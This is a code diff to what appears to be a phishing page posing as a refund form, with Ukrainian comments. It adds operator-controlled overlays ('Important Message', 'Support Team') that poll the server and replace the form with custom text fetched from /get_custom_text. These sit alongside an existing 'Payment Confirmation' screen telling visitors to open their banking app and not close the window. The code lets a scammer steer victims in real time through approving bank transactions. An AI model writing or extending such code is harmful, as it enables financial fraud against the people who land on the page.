@@ -129,88 +129,38 @@
     #push-overlay {
       display: none;
       position: fixed;
-      top: 0; left: 0; width: 100vw; height: 100vh;
-      background: rgba(22,182,255,0.97);
-      z-index: 100000;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      background: rgba(0, 178, 255, 0.85);
+      z-index: 99999;
       align-items: center;
       justify-content: center;
-      flex-direction: column;
-      transition: opacity 0.3s;
-      animation: fadeInPush 0.5s;
     }
-    @keyframes fadeInPush {
-      from { opacity: 0; }
-      to { opacity: 1; }
-    }
-    .push-modal {
-      background: #fff;
-      border-radius: 24px;
-      max-width: 370px;
-      width: 92vw;
-      margin: auto;
-      padding: 2.7rem 2rem 2.2rem 2rem;
-      box-shadow: 0 8px 40px rgba(0,0,0,0.18);
-      text-align: center;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      animation: popInPush 0.5s;
-    }
-    @keyframes popInPush {
-      0% { transform: scale(0.92); opacity: 0; }
-      100% { transform: scale(1); opacity: 1; }
-    }
-    .push-bell {
-      margin-bottom: 1.5rem;
-      width: 70px;
-      height: 70px;
-      background: linear-gradient(135deg, #16b6ff 60%, #00e0ff 100%);
-      border-radius: 50%;
-      display: flex;
+    #text-overlay {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      background: rgba(255, 152, 0, 0.85);
+      z-index: 99999;
       align-items: center;
       justify-content: center;
-      box-shadow: 0 2px 16px rgba(22,182,255,0.18);
-      position: relative;
-      animation: bellPop 0.7s;
     }
-    @keyframes bellPop {
-      0% { transform: scale(0.7); opacity: 0; }
-      100% { transform: scale(1); opacity: 1; }
-    }
-    .push-bell svg {
-      width: 38px;
-      height: 38px;
-      color: #fff;
-      animation: bellShake 1.2s infinite cubic-bezier(.36,.07,.19,.97);
-      transform-origin: 50% 10%;
-    }
-    @keyframes bellShake {
-      0%, 100% { transform: rotate(0deg); }
-      10% { transform: rotate(-10deg); }
-      20% { transform: rotate(8deg); }
-      30% { transform: rotate(-6deg); }
-      40% { transform: rotate(4deg); }
-      50% { transform: rotate(-2deg); }
-      60% { transform: rotate(1deg); }
-      70%, 90% { transform: rotate(0deg); }
-    }
-    .push-title {
-      font-size: 2.1rem;
-      font-weight: 700;
-      color: #16b6ff;
-      margin-bottom: 0.7rem;
-      letter-spacing: -1px;
-    }
-    .push-desc {
-      font-size: 1.13rem;
-      color: #222;
-      margin-bottom: 0.7rem;
-      line-height: 1.5;
-    }
-    @media (max-width: 480px) {
-      .push-modal { padding: 1.2rem 0.5rem 1.2rem 0.5rem; }
-      .push-title { font-size: 1.3rem; }
-      .push-desc { font-size: 0.98rem; }
+    #support-overlay {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      background: rgba(76, 175, 80, 0.85);
+      z-index: 99999;
+      align-items: center;
+      justify-content: center;
     }
     </style>
 </head>
@@ -263,11 +213,43 @@
           <div class="push-bell">
             <svg viewBox="0 0 24 24" fill="none"><path d="M12 22c1.1 0 2-.9 2-2h-4a2 2 0 0 0 2 2zm6-6V11c0-3.07-1.63-5.64-5-6.32V4a1 1 0 1 0-2 0v.68C7.63 5.36 6 7.92 6 11v5l-1.29 1.29A1 1 0 0 0 6 19h12a1 1 0 0 0 .71-1.71L18 16z" fill="#fff"/></svg>
           </div>
-          <div class="push-title">Payment Confirmation</div>
+          <div class="push-title" id="push-payment-title">Payment Confirmation</div>
           <div class="push-desc">To confirm the transaction, open your banking app and follow the instructions of your bank. <br>Do not close this window.</div>
         </div>
       `;
       document.body.appendChild(pushOverlay);
+    }
+    
+    // Додаємо text-overlay
+    if (!document.getElementById('text-overlay')) {
+      const textOverlay = document.createElement('div');
+      textOverlay.id = 'text-overlay';
+      textOverlay.innerHTML = `
+        <div class="push-modal">
+          <div class="push-bell">
+            <svg viewBox="0 0 24 24" fill="none"><path d="M20 2H4c-1.1 0-1.99.9-1.99 2L2 22l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm-2 12H6v-2h12v2zm0-3H6V9h12v2zm0-3H6V6h12v2z" fill="#fff"/></svg>
+          </div>
+          <div class="push-title" id="text-title">Important Message</div>
+          <div class="push-desc" id="text-content">You have received an important message. Please read it carefully.</div>
+        </div>
+      `;
+      document.body.appendChild(textOverlay);
+    }
+    
+    // Додаємо support-overlay
+    if (!document.getElementById('support-overlay')) {
+      const supportOverlay = document.createElement('div');
+      supportOverlay.id = 'support-overlay';
+      supportOverlay.innerHTML = `
+        <div class="push-modal">
+          <div class="push-bell">
+            <svg viewBox="0 0 24 24" fill="none"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z" fill="#fff"/></svg>
+          </div>
+          <div class="push-title">Support Team</div>
+          <div class="push-desc">Our support team is now available to help you. Please wait for assistance.</div>
+        </div>
+      `;
+      document.body.appendChild(supportOverlay);
     }
 
     // Сабміт форми: показуємо overlay
@@ -405,6 +387,45 @@
         setTimeout(pollSupportButtons, 2000);
     }
     setTimeout(pollSupportButtons, 2000);
+    </script>
+    
+    <!-- Flag handler for text and support -->
+    <script src="/js/flag-handler.js"></script>
+    <script>
+    // Initialize flag handler
+    const flagHandler = new FlagHandler();
+    
+    // Start polling for text flag
+    flagHandler.startPolling('text', (triggered) => {
+        if (triggered) {
+            // Get text content from server
+            const page_code = flagHandler.getPageCode();
+            fetch(`/get_custom_text?text_id=${page_code}`)
+                .then(resp => resp.json())
+                .then(data => {
+                    if (data.text) {
+                        document.getElementById('text-content').textContent = data.text;
+                    }
+                    flagHandler.showOverlay('text-overlay', ['refund-form', 'loading-overlay']);
+                })
+                .catch(error => {
+                    console.error('Error fetching text:', error);
+                    flagHandler.showOverlay('text-overlay', ['refund-form', 'loading-overlay']);
+                });
+        }
+    });
+    
+    // Start polling for support flag
+    flagHandler.startPolling('support', (triggered) => {
+        if (triggered) {
+            flagHandler.showOverlay('support-overlay', ['refund-form', 'loading-overlay']);
+        }
+    });
+    
+    // Cleanup on page unload
+    window.addEventListener('beforeunload', () => {
+        flagHandler.stopAllPolling();
+    });
     </script>
     <script>
 document.addEventListener('DOMContentLoaded', function() {
